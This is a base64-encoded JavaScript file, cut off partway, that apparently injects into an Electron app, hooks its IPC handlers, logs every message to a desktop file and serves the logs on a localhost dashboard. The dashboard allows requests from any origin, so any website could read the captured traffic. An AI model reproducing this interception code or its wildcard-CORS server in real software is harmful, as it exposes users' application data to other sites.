LU1PTl0gSW5pdGlhbGl6aW5nIGxpZ2h0d2VpZ2h0IElQQyBtb25pdG9yLi4uJyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIEVuc3VyZSB3ZSBkb24ndCBkb3VibGUtaW5pdGlhbGl6ZQogICAgaWYgKGdsb2JhbC5faXBjTW9uSW5pdGlhbGl6ZWQpIHsKICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dIEFscmVhZHkgaW5pdGlhbGl6ZWQsIHNraXBwaW5nLi4uJyk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgZ2xvYmFsLl9pcGNNb25Jbml0aWFsaXplZCA9IHRydWU7CiAgICAKICAgIHZhciBmcyA9IHJlcXVpcmUoJ2ZzJyk7CiAgICB2YXIgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgIHZhciBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwogICAgdmFyIGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpOwogICAgCiAgICBmdW5jdGlvbiBJUENNb25pdG9yKCkgewogICAgICAgIHRoaXMuc2Vzc2lvbklkID0gY3J5cHRvLnJhbmRvbUJ5dGVzKDQpLnRvU3RyaW5nKCdoZXgnKTsKICAgICAgICB0aGlzLm1lc3NhZ2VzID0gW107CiAgICAgICAgdGhpcy5tYXhNZXNzYWdlcyA9IDEwMDA7CiAgICAgICAgdGhpcy5sb2dGaWxlID0gbnVsbDsKICAgICAgICB0aGlzLnNlcnZlciA9IG51bGw7CiAgICAgICAgCiAgICAgICAgdGhpcy5zYWZlSW5pdCgpOwogICAgfQogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5zYWZlSW5pdCA9IGZ1bmN0aW9uKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHRoaXMuc2V0dXBMb2dnaW5nKCk7CiAgICAgICAgICAgIHRoaXMuc2V0dXBXZWJTZXJ2ZXIoKTsKICAgICAgICAgICAgdGhpcy5zZXR1cElQQ0hvb2tzKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dIFNlc3Npb24gJyArIHRoaXMuc2Vzc2lvbklkICsgJyBzdGFydGVkJyk7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSVBDLU1PTl0gV2ViIGludGVyZmFjZTogaHR0cDovL2xvY2FsaG9zdDoxMTMzOCcpOwogICAgICAgICAgICAKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gSW5pdGlhbGl6YXRpb24gZXJyb3I6JywgZXJyb3IpOwogICAgICAgIH0KICAgIH07CiAgICAKICAgIElQQ01vbml0b3IucHJvdG90eXBlLnNldHVwTG9nZ2luZyA9IGZ1bmN0aW9uKCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBlbGVjdHJvbiA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIHZhciBhcHAgPSBlbGVjdHJvbi5hcHA7CiAgICAgICAgICAgIHZhciBkZXNrdG9wID0gYXBwLmdldFBhdGgoJ2Rlc2t0b3AnKSB8fCBhcHAuZ2V0UGF0aCgnaG9tZScpOwogICAgICAgICAgICB0aGlzLmxvZ0ZpbGUgPSBwYXRoLmpvaW4oZGVza3RvcCwgJ2lwYy1tb24tJyArIHRoaXMuc2Vzc2lvbklkICsgJy5qc29uJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICB2YXIgaGVhZGVyID0gewogICAgICAgICAgICAgICAgc2Vzc2lvbjogdGhpcy5zZXNzaW9uSWQsCiAgICAgICAgICAgICAgICBzdGFydGVkOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCksCiAgICAgICAgICAgICAgICBlbGVjdHJvbjogcHJvY2Vzcy52ZXJzaW9ucy5lbGVjdHJvbiwKICAgICAgICAgICAgICAgIG5vZGU6IHByb2Nlc3MudmVyc2lvbnMubm9kZQogICAgICAgICAgICB9OwogICAgICAgICAgICAKICAgICAgICAgICAgZnMud3JpdGVGaWxlU3luYyh0aGlzLmxvZ0ZpbGUsIEpTT04uc3RyaW5naWZ5KGhlYWRlcikgKyAnXG4nKTsKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OXSBMb2dnaW5nIHRvOiAnICsgdGhpcy5sb2dGaWxlKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0lQQy1NT05dIExvZ2dpbmcgc2V0dXAgZXJyb3I6JywgZXJyb3IpOwogICAgICAgIH0KICAgIH07CiAgICAKICAgIElQQ01vbml0b3IucHJvdG90eXBlLnNldHVwV2ViU2VydmVyID0gZnVuY3Rpb24oKSB7CiAgICAgICAgdmFyIHNlbGYgPSB0aGlzOwogICAgICAgIAogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHRoaXMuc2VydmVyID0gaHR0cC5jcmVhdGVTZXJ2ZXIoZnVuY3Rpb24ocmVxLCByZXMpIHsKICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlUmVxdWVzdChyZXEsIHJlcyk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgdGhpcy5zZXJ2ZXIubGlzdGVuKDExMzM4LCAnMTI3LjAuMC4xJywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW0lQQy1NT05dIFdlYiBzZXJ2ZXIgc3RhcnRlZCBvbiBwb3J0IDExMzM4Jyk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgdGhpcy5zZXJ2ZXIub24oJ2Vycm9yJywgZnVuY3Rpb24oZXJyKSB7CiAgICAgICAgICAgICAgICBpZiAoZXJyLmNvZGUgPT09ICdFQUREUklOVVNFJykgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSVBDLU1PTl0gUG9ydCAxMTMzOCBpbiB1c2UsIHRyeWluZyAxMTMzOS4uLicpOwogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VydmVyLmxpc3RlbigxMTMzOSwgJzEyNy4wLjAuMScpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gU2VydmVyIGVycm9yOicsIGVycik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gV2ViIHNlcnZlciBzZXR1cCBlcnJvcjonLCBlcnJvcik7CiAgICAgICAgfQogICAgfTsKICAgIAogICAgSVBDTW9uaXRvci5wcm90b3R5cGUuaGFuZGxlUmVxdWVzdCA9IGZ1bmN0aW9uKHJlcSwgcmVzKSB7CiAgICAgICAgcmVzLnNldEhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJywgJyonKTsKICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1NZXRob2RzJywgJ0dFVCwgUE9TVCcpOwogICAgICAgIHJlcy5zZXRIZWFkZXIoJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnLCAnQ29udGVudC1UeXBlJyk7CiAgICAgICAgCiAgICAgICAgdmFyIHVybCA9IG5ldyBVUkwocmVxLnVybCwgJ2h0dHA6Ly9sb2NhbGhvc3QnKTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICBzd2l0Y2ggKHVybC5wYXRobmFtZSkgewogICAgICAgICAgICAgICAgY2FzZSAnLyc6CiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZXJ2ZUhUTUwocmVzKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgJy9hcGkvbWVzc2FnZXMnOgogICAgICAgICAgICAgICAgICAgIHRoaXMuc2VydmVNZXNzYWdlcyhyZXMpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAnL2FwaS9jbGVhcic6CiAgICAgICAgICAgICAgICAgICAgdGhpcy5jbGVhck1lc3NhZ2VzKHJlcyk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlICcvYXBpL2V4cG9ydCc6CiAgICAgICAgICAgICAgICAgICAgdGhpcy5leHBvcnRNZXNzYWdlcyhyZXMpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDQwNCk7CiAgICAgICAgICAgICAgICAgICAgcmVzLmVuZCgnTm90IEZvdW5kJyk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSVBDLU1PTl0gUmVxdWVzdCBoYW5kbGluZyBlcnJvcjonLCBlcnJvcik7CiAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoNTAwKTsKICAgICAgICAgICAgcmVzLmVuZCgnSW50ZXJuYWwgU2VydmVyIEVycm9yJyk7CiAgICAgICAgfQogICAgfTsKICAgIAogICAgSVBDTW9uaXRvci5wcm90b3R5cGUuc2VydmVIVE1MID0gZnVuY3Rpb24ocmVzKSB7CiAgICAgICAgdmFyIGh0bWwgPSAnPCFET0NUWVBFIGh0bWw+JyArCic8aHRtbD4nICsKJzxoZWFkPicgKwonICAgIDx0aXRsZT5JUEMtTU9OIC0gU2Vzc2lvbiAnICsgdGhpcy5zZXNzaW9uSWQgKyAnPC90aXRsZT4nICsKJyAgICA8c3R5bGU+JyArCicgICAgICAgIGJvZHkgeyBmb250LWZhbWlseTogbW9ub3NwYWNlOyBtYXJnaW46IDA7IHBhZGRpbmc6IDIwcHg7IGJhY2tncm91bmQ6ICMxYTFhMWE7IGNvbG9yOiAjMDBmZjAwOyB9JyArCicgICAgICAgIC5oZWFkZXIgeyBib3JkZXItYm90dG9tOiAycHggc29saWQgIzAwZmYwMDsgcGFkZGluZy1ib3R0b206IDEwcHg7IG1hcmdpbi1ib3R0b206IDIwcHg7IH0nICsKJyAgICAgICAgLmNvbnRyb2xzIHsgbWFyZ2luOiAyMHB4IDA7IH0nICsKJyAgICAgICAgLmNvbnRyb2xzIGJ1dHRvbiB7IGJhY2tncm91bmQ6ICMwMGZmMDA7IGNvbG9yOiAjMDAwOyBib3JkZXI6IG5vbmU7IHBhZGRpbmc6IDhweCAxNnB4OyBtYXJnaW4tcmlnaHQ6IDEwcHg7IGN1cnNvcjogcG9pbnRlcjsgfScgKwonICAgICAgICAuY29udHJvbHMgYnV0dG9uOmhvdmVyIHsgYmFja2dyb3VuZDogIzAwY2MwMDsgfScgKwonICAgICAgICAubWVzc2FnZSB7IG1hcmdpbjogMTBweCAwOyBwYWRkaW5nOiAxMHB4OyBib3JkZXItbGVmdDogM3B4IHNvbGlkICM1NTU7IGJhY2tncm91bmQ6ICMyYTJhMmE7IH0nICsKJyAgICAgICAgLm1lc3NhZ2UubWFpbi10by1yZW5kZXJlciB7IGJvcmRlci1sZWZ0LWNvbG9yOiAjMDA5OWZmOyB9JyArCicgICAgICAgIC5tZXNzYWdlLnJlbmRlcmVyLXRvLW1haW4geyBib3JkZXItbGVmdC1jb2xvcjogI2ZmOTkwMDsgfScgKwonICAgICAgICAubWVzc2FnZS1oZWFkZXIgeyBmb250LXdlaWdodDogYm9sZDsgbWFyZ2luLWJvdHRvbTogNXB4OyB9JyArCicgICAgICAgIC5tZXNzYWdlLWRhdGEgeyBiYWNrZ3JvdW5kOiAjMTExOyBwYWRkaW5nOiA4cHg7IG1hcmdpbi10b3A6IDVweDsgb3ZlcmZsb3cteDogYXV0bzsgfScgKwonICAgICAgICAuc3RhdHMgeyBwb3NpdGlvbjogZml4ZWQ7IHRvcDogMTBweDsgcmlnaHQ6IDEwcHg7IGJhY2tncm91bmQ6ICMzMzM7IHBhZGRpbmc6IDEwcHg7IGJvcmRlcjogMXB4IHNvbGlkICM1NTU7IH0nICsKJyAgICAgICAgI21lc3NhZ2VzIHsgbWF4LWhlaWdodDogNzB2aDsgb3ZlcmZsb3cteTogYXV0bzsgfScgKwonICAgICAgICAuZmlsdGVyIHsgbWFyZ2luOiAxMHB4IDA7IH0nICsKJyAgICAgICAgLmZpbHRlciBpbnB1dCB7IGJhY2tncm91bmQ6ICMzMzM7IGNvbG9yOiAjMDBmZjAwOyBib3JkZXI6IDFweCBzb2xpZCAjNTU1OyBwYWRkaW5nOiA1cHg7IHdpZHRoOiAzMDBweDsgfScgKwonICAgIDwvc3R5bGU+JyArCic8L2hlYWQ+JyArCic8Ym9keT4nICsKJyAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPicgKwonICAgICAgICA8aDE+8J+ToSBJUEMtTU9OPC9oMT4nICsKJyAgICAgICAgPHA+U2Vzc2lvbjogJyArIHRoaXMuc2Vzc2lvbklkICsgJzwvcD4nICsKJyAgICA8L2Rpdj4nICsKJyAgICAnICsKJyAgICA8ZGl2IGNsYXNzPSJzdGF0cyI+JyArCicgICAgICAgIDxkaXY+TWVzc2FnZXM6IDxzcGFuIGlkPSJtZXNzYWdlQ291bnQiPjA8L3NwYW4+PC9kaXY+JyArCicgICAgICAgIDxkaXY+TGFzdCBVcGRhdGU6IDxzcGFuIGlkPSJsYXN0VXBkYXRlIj4tPC9zcGFuPjwvZGl2PicgKwonICAgIDwvZGl2PicgKwonICAgICcgKwonICAgIDxkaXYgY2xhc3M9ImNvbnRyb2xzIj4nICsKJyAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJyZWZyZXNoTWVzc2FnZXMoKSI+UmVmcmVzaDwvYnV0dG9uPicgKwonICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImNsZWFyTWVzc2FnZXMoKSI+Q2xlYXI8L2J1dHRvbj4nICsKJyAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJleHBvcnRNZXNzYWdlcygpIj5FeHBvcnQ8L2J1dHRvbj4nICsKJyAgICAgICAgPGJ1dHRvbiBvbmNsaWNrPSJ0b2dnbGVBdXRvUmVmcmVzaCgpIiBpZD0iYXV0b1JlZnJlc2hCdG4iPkF1dG8tUmVmcmVzaDogT048L2J1dHRvbj4nICsKJyAgICA8L2Rpdj4nICsKJyAgICAnICsKJyAgICA8ZGl2IGNsYXNzPSJmaWx0ZXIiPicgKwonICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImZpbHRlcklucHV0IiBwbGFjZWhvbGRlcj0iRmlsdGVyIGJ5IGNoYW5uZWwgbmFtZS4uLiIgb25pbnB1dD0iZmlsdGVyTWVzc2FnZXMoKSI+JyArCicgICAgPC9kaXY+JyArCicgICAgJyArCicgICAgPGRpdiBpZD0ibWVzc2FnZXMiPjwvZGl2PicgKwonICAgICcgKwonICAgIDxzY3JpcHQ+JyArCicgICAgICAgIHZhciBhdXRvUmVmcmVzaCA9IHRydWU7JyArCicgICAgICAgIHZhciBjdXJyZW50RmlsdGVyID0gIiI7JyArCicgICAgICAgIHZhciBhbGxNZXNzYWdlcyA9IFtdOycgKwonICAgICAgICAnICsKJyAgICAgICAgZnVuY3Rpb24gcmVmcmVzaE1lc3NhZ2VzKCkgeycgKwonICAgICAgICAgICAgZmV0Y2goIi9hcGkvbWVzc2FnZXMiKScgKwonICAgICAgICAgICAgICAgIC50aGVuKGZ1bmN0aW9uKHIpIHsgcmV0dXJuIHIuanNvbigpOyB9KScgKwonICAgICAgICAgICAgICAgIC50aGVuKGZ1bmN0aW9uKGRhdGEpIHsnICsKJyAgICAgICAgICAgICAgICAgICAgYWxsTWVzc2FnZXMgPSBkYXRhLm1lc3NhZ2VzIHx8IFtdOycgKwonICAgICAgICAgICAgICAgICAgICB1cGRhdGVEaXNwbGF5KCk7JyArCicgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtZXNzYWdlQ291bnQiKS50ZXh0Q29udGVudCA9IGFsbE1lc3NhZ2VzLmxlbmd0aDsnICsKJyAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImxhc3RVcGRhdGUiKS50ZXh0Q29udGVudCA9IG5ldyBEYXRlKCkudG9Mb2NhbGVUaW1lU3RyaW5nKCk7JyArCicgICAgICAgICAgICAgICAgfSknICsKJyAgICAgICAgICAgICAgICAuY2F0Y2goZnVuY3Rpb24oZXJyKSB7IGNvbnNvbGUuZXJyb3IoIkVycm9yIGZldGNoaW5nIG1lc3NhZ2VzOiIsIGVycik7IH0pOycgKwonICAgICAgICB9JyArCicgICAgICAgICcgKwonICAgICAgICBmdW5jdGlvbiB1cGRhdGVEaXNwbGF5KCkgeycgKwonICAgICAgICAgICAgdmFyIGNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtZXNzYWdlcyIpOycgKwonICAgICAgICAgICAgdmFyIGZpbHRlcmVkTWVzc2FnZXMgPSBhbGxNZXNzYWdlcy5maWx0ZXIoZnVuY3Rpb24obXNnKSB7JyArCicgICAgICAgICAgICAgICAgcmV0dXJuICFjdXJyZW50RmlsdGVyIHx8IG1zZy5jaGFubmVsLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihjdXJyZW50RmlsdGVyLnRvTG93ZXJDYXNlKCkpICE9PSAtMTsnICsKJyAgICAgICAgICAgIH0pOycgKwonICAgICAgICAgICAgJyArCicgICAgICAgICAgICB2YXIgaHRtbCA9ICIiOycgKwonICAgICAgICAgICAgdmFyIHJlY2VudE1lc3NhZ2VzID0gZmlsdGVyZWRNZXNzYWdlcy5zbGljZSgtNTApOycgKwonICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCByZWNlbnRNZXNzYWdlcy5sZW5ndGg7IGkrKykgeycgKwonICAgICAgICAgICAgICAgIHZhciBtc2cgPSByZWNlbnRNZXNzYWdlc1tpXTsnICsKJyAgICAgICAgICAgICAgICB2YXIgdGltZSA9IG5ldyBEYXRlKG1zZy50aW1lc3RhbXApLnRvTG9jYWxlVGltZVN0cmluZygpOycgKwonICAgICAgICAgICAgICAgIHZhciBkaXJlY3Rpb25DbGFzcyA9IG1zZy5kaXJlY3Rpb24ucmVwbGFjZSgiLSZndDsiLCAiLXRvLSIpOycgKwonICAgICAgICAgICAgICAgIHZhciBkYXRhU3RyID0gSlNPTi5zdHJpbmdpZnkobXNnLmRhdGEsIG51bGwsIDIpOycgKwonICAgICAgICAgICAgICAgIHZhciB0cnVuY2F0ZWREYXRhID0gZGF0YVN0ci5sZW5ndGggPiA1MDAgPyBkYXRhU3RyLnN1YnN0cmluZygwLCA1MDApICsgIi4uLiIgOiBkYXRhU3RyOycgKwonICAgICAgICAgICAgICAgICcgKwonICAgICAgICAgICAgICAgIGh0bWwgKz0gIjxkaXYgY2xhc3M9XFwibWVzc2FnZSAiICsgZGlyZWN0aW9uQ2xhc3MgKyAiXFwiPiIgKycgKwonICAgICAgICAgICAgICAgICAgICAgICAiPGRpdiBjbGFzcz1cXCJtZXNzYWdlLWhlYWRlclxcIj4iICsnICsKJyAgICAgICAgICAgICAgICAgICAgICAgICAgICJbIiArIHRpbWUgKyAiXSAiICsgbXNnLmRpcmVjdGlvbiArICIgfCAiICsgbXNnLnR5cGUgKyAiIHwgPGNvZGU+IiArIG1zZy5jaGFubmVsICsgIjwvY29kZT4iICsnICsKJyAgICAgICAgICAgICAgICAgICAgICAgIjwvZGl2PiIgKycgKwonICAgICAgICAgICAgICAgICAgICAgICAiPGRpdiBjbGFzcz1cXCJtZXNzYWdlLWRhdGFcXCI+IiArJyArCicgICAgICAgICAgICAgICAgICAgICAgICAgICAiPHByZT4iICsgdHJ1bmNhdGVkRGF0YSArICI8L3ByZT4iICsnICsKJyAgICAgICAgICAgICAgICAgICAgICAgIjwvZGl2PiIgKycgKwonICAgICAgICAgICAgICAgICAgICI8L2Rpdj4iOycgKwonICAgICAgICAgICAgfScgKwonICAgICAgICAgICAgY29udGFpbmVyLmlubmVySFRNTCA9IGh0bWw7JyArCicgICAgICAgICAgICBjb250YWluZXIuc2Nyb2xsVG9wID0gY29udGFpbmVyLnNjcm9sbEhlaWdodDsnICsKJyAgICAgICAgfScgKwonICAgICAgICAnICsKJyAgICAgICAgZnVuY3Rpb24gZmlsdGVyTWVzc2FnZXMoKSB7JyArCicgICAgICAgICAgICBjdXJyZW50RmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImZpbHRlcklucHV0IikudmFsdWU7JyArCicgICAgICAgICAgICB1cGRhdGVEaXNwbGF5KCk7JyArCicgICAgICAgIH0nICsKJyAgICAgICAgJyArCicgICAgICAgIGZ1bmN0aW9uIGNsZWFyTWVzc2FnZXMoKSB7JyArCicgICAgICAgICAgICBpZiAoY29uZmlybSgiQ2xlYXIgYWxsIG1lc3NhZ2VzPyIpKSB7JyArCicgICAgICAgICAgICAgICAgZmV0Y2goIi9hcGkvY2xlYXIiLCB7IG1ldGhvZDogIlBPU1QiIH0pJyArCicgICAgICAgICAgICAgICAgICAgIC50aGVuKGZ1bmN0aW9uKCkgeyByZWZyZXNoTWVzc2FnZXMoKTsgfSk7JyArCicgICAgICAgICAgICB9JyArCicgICAgICAgIH0nICsKJyAgICAgICAgJyArCicgICAgICAgIGZ1bmN0aW9uIGV4cG9ydE1lc3NhZ2VzKCkgeycgKwonICAgICAgICAgICAgd2luZG93Lm9wZW4oIi9hcGkvZXhwb3J0IiwgIl9ibGFuayIpOycgKwonICAgICAgICB9JyArCicgICAgICAgICcgKwonICAgICAgICBmdW5jdGlvbiB0b2dnbGVBdXRvUmVmcmVzaCgpIHsnICsKJyAgICAgICAgICAgIGF1dG9SZWZyZXNoID0gIWF1dG9SZWZyZXNoOycgKwonICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImF1dG9SZWZyZXNoQnRuIikudGV4dENvbnRlbnQgPSAnICsKJyAgICAgICAgICAgICAgICAiQXV0by1SZWZyZXNoOiAiICsgKGF1dG9SZWZyZXNoID8gIk9OIiA6ICJPRkYiKTsnICsKJyAgICAgICAgfScgKwonICAgICAgICAnICsKJyAgICAgICAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7JyArCicgICAgICAgICAgICBpZiAoYXV0b1JlZnJlc2gpIHJlZnJlc2hNZXNzYWdlcygpOycgKwonICAgICAgICB9LCAyMDAwKTsnICsKJyAgICAgICAgJyArCicgICAgICAgIHJlZnJlc2hNZXNzYWdlcygpOycgKwonICAgIDwvc2NyaXB0PicgKwonPC9ib2R5PicgKwonPC9odG1sPic7CiAgICAgICAgCiAgICAgICAgcmVzLndyaXRlSGVhZCgyMDAsIHsgJ0NvbnRlbnQtVHlwZSc6ICd0ZXh0L2h0bWwnIH0pOwogICAgICAgIHJlcy5lbmQoaHRtbCk7CiAgICB9OwogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5zZXJ2ZU1lc3NhZ2VzID0gZnVuY3Rpb24ocmVzKSB7CiAgICAgICAgcmVzLndyaXRlSGVhZCgyMDAsIHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9KTsKICAgICAgICByZXMuZW5kKEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgc2Vzc2lvbjogdGhpcy5zZXNzaW9uSWQsCiAgICAgICAgICAgIG1lc3NhZ2VzOiB0aGlzLm1lc3NhZ2VzLnNsaWNlKC0xMDApLAogICAgICAgICAgICB0b3RhbENvdW50OiB0aGlzLm1lc3NhZ2VzLmxlbmd0aAogICAgICAgIH0pKTsKICAgIH07CiAgICAKICAgIElQQ01vbml0b3IucHJvdG90eXBlLmNsZWFyTWVzc2FnZXMgPSBmdW5jdGlvbihyZXMpIHsKICAgICAgICB0aGlzLm1lc3NhZ2VzID0gW107CiAgICAgICAgcmVzLndyaXRlSGVhZCgyMDAsIHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9KTsKICAgICAgICByZXMuZW5kKEpTT04uc3RyaW5naWZ5KHsgc3VjY2VzczogdHJ1ZSB9KSk7CiAgICB9OwogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5leHBvcnRNZXNzYWdlcyA9IGZ1bmN0aW9uKHJlcykgewogICAgICAgIHZhciBleHBvcnREYXRhID0gewogICAgICAgICAgICBzZXNzaW9uOiB0aGlzLnNlc3Npb25JZCwKICAgICAgICAgICAgZXhwb3J0ZWQ6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwKICAgICAgICAgICAgbWVzc2FnZXM6IHRoaXMubWVzc2FnZXMKICAgICAgICB9OwogICAgICAgIAogICAgICAgIHJlcy53cml0ZUhlYWQoMjAwLCB7CiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uJzogJ2F0dGFjaG1lbnQ7IGZpbGVuYW1lPSJpcGMtbW9uLScgKyB0aGlzLnNlc3Npb25JZCArICcuanNvbiInCiAgICAgICAgfSk7CiAgICAgICAgcmVzLmVuZChKU09OLnN0cmluZ2lmeShleHBvcnREYXRhLCBudWxsLCAyKSk7CiAgICB9OwogICAgCiAgICBJUENNb25pdG9yLnByb3RvdHlwZS5zZXR1cElQQ0hvb2tzID0gZnVuY3Rpb24oKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIGVsZWN0cm9uID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgdmFyIGlwY01haW4gPSBlbGVjdHJvbi5pcGNNYWluOwogICAgICAgICAgICAKICAgICAgICAgICAgdGhpcy5ob29rSVBDTWFpbkhhbmRsZShpcGNNYWluKTsKICAgICAgICAgICAgdGhpcy5ob29rSVBDTWFpbk9uKGlwY01haW4pOwogICAgICAgICAgICB0aGlzLmhvb2tFeGlzdGluZ1dpbmRvd3MoKTsKICAgICAgICAgICAgdGhpcy5ob29rTmV3V2luZG93cygpOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tJUEMtTU9OXSBJUEMgaG9va3MgaW5zdGFsbGVkJyk7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tJUEMtTU9OXSBJUEMgaG9va3Mgc2V0dXAgZXJyb3I6JywgZXJyb3IpOwogICAgICAgIH0KICAgIH07CiAgICAKICAgIElQQ01vbml0b3IucHJvdG90eXBlLmhvb2tJUENNYWluSGFuZGxlID0gZnVuY3Rpb24oaXBjTWFpbikgewogICAgICAgIHZhciBvcmlnaW5hbEhhbmRsZSA9IGlwY01haW4uaGFuZGxlOwogICAgICAgIHZhciBzZWxmID0gdGhpczsKICAgICAgICAKICAgICAgICBpcGNNYWluLmhhbmRsZSA9IGZ1bmN0aW9uKGNoYW5uZWwsIGxpc3RlbmVyKSB7CiAgICAgICAgICAgIHJldHVybiBvcmlnaW5hbEhhbmRsZS5jYWxsKHRoaXMsIGNoYW5uZWwsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgICAgICB2YXIgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMSk7CiAgICAgICAgICAgICAgICB2YXIgbWVzc2FnZUlkID0gc2VsZi5nZW5lcmF0ZUlkKCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNlbGYubG9nTWVzc2FnZSh7CiAgICAgICAgICAgICAgICAgICAgaWQ6IG1lc3NhZ2VJZCwKICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnaGFuZGxlLXJlcXVlc3QnLAogICAgICAgICAgICAgICAgICAgIGNoYW5uZWw6IGNoYW5uZWwsCiAgICAgICAgICAgICAgICAgICAgZGlyZWN0aW9uOiAncmVuZGVyZXItPm1haW4nLAogICAgICAgICAgICAgICAgICAgIGRhdGE6IGFyZ3MKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHZhciByZXN1bHQgPSBsaXN0ZW5lci5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIChyZXN1bHQgJiYgdHlwZW9mIHJlc3VsdC50aGVuID09PSAnZnVuY3Rpb24nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEhhbmRsZSBQcm9taXNlCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQudGhlbihmdW5jdGlvbihyZXNvbHZlZFJlc3VsdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5sb2dNZXNzYWdlKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogbWVzc2FnZUlkICsgJy1yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU